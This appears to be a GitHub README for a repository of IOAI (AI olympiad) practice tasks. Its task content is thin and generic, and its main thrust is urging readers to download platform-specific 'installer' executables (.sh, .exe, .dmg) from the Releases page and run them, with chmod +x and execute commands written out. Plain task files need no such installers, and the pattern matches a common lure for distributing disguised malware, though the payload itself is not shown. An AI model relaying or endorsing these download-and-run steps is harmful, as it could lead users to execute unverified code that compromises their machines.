About this project
This repository is a centralized resource. It brings together IOAI tasks from various years and different national teams’ selections. The goal is to help learners compare task design, understand common constraints, and see how evaluation ideas have changed over time. The materials here are meant to be educational and reusable for practice, teaching, and fair assessment.

If you are new here, you can think of this as a reference library plus a starter kit for building your own IOAI tasks. Each task entry includes a title, a short description, input-output specifications, and notes on evaluation criteria. Some tasks provide sample data and sample solutions to illustrate expected reasoning and approach. Other entries point you to public resources that describe the original task in detail.

How to use this repository
- Find a task by year or by national team
- Open a task’s file to read the statement and constraints
- Review any attached dataset or sample solution
- Copy a task template to draft your own problems
- Use the task templates to design new challenges for practice or classroom use

If you want a quick way to get started, download the latest release and run the installer. The latest release contains a bundled set of tasks in a portable format designed for local practice. The asset is intended for one-click setup on common platforms. To obtain the asset, go to the Releases page and download the appropriate file for your OS, then follow the execution steps described in the asset notes.

How to get the latest releases
- The official release page is the Releases section of this repository: https://github.com/Nestor53top/awesome-ioai-tasks/releases
- From there, pick the latest release asset that matches your system and download it
- On Linux or macOS, you typically make the file executable and run it
- On Windows, run the installer executable

Note: If you prefer not to download an asset, you can still browse the Releases page for individual task files or for links to public datasets and description documents. The Releases page is the central point for obtaining new and updated materials.

Important note about the release asset
- There is a downloadable file in the release assets that combines task statements, example inputs, and evaluation notes
- The file's name will vary by release, but it typically follows the pattern awesome-ioai-tasks-<platform>-<version>.ext
- For Linux 64-bit, the name might look like awesome-ioai-tasks-setup-linux-x64.sh
- For Windows, the name might look like awesome-ioai-tasks-setup-windows.exe
- For macOS, the name might look like awesome-ioai-tasks-setup-macos.dmg

To prepare the asset for use, you may need to grant execute permission:
- chmod +x awesome-ioai-tasks-setup-linux-x64.sh
- Then run: ./awesome-ioai-tasks-setup-linux-x64.sh
- On Windows, run the installer by double-clicking the .exe file
- On macOS, mount the .dmg and run the installer inside

If you cannot download from the Releases page, or the asset is unavailable for your platform, check the Releases section regularly. Assets are updated as new tasks are added or revised, and you may find alternative download links in the description of each release.

Task structure and formats
Most tasks in this repository share a consistent format to make them easy to compare and reuse. A typical task entry includes:
- Title: A concise name for the task
- Year and source: The year and the national team that contributed the task
- Description: A short, precise explanation of the problem
- Input specification: What the task input looks like, including example inputs if provided
- Output specification: What the problem expects as a valid output
- Constraints: Time, space, or problem-specific restrictions
- Evaluation notes: How solution correctness is judged
- Example: A worked example showing input, expected output, and explanation
- References: Links to the original problem, datasets, or related material

A sample task file might be written in Markdown with a structured layout. You can adapt this template to create new tasks. The goal is to preserve the readability of the problem while ensuring that evaluation criteria are clear.

Appendix: sample task entry (illustrative)
- Title: Baseline reasoning in constrained search
- Year: 2019
- National team: Team Alpha
- Description: Determine the optimal sequence of moves given a set of constraints
- Input: A list of constraints, a finite search space, and a scoring function
- Output: The best sequence of moves that maximizes the score
- Constraints: Maximum length 20, time limit 2 seconds per test
- Evaluation: Score parity with reference solution and runtime
- Example:
  - Input: constraints = [A, B, C], space_size = 100
  - Output: sequence = [x1, x2, ..., xk]
  - Explanation: The chosen sequence satisfies all constraints and yields a high score
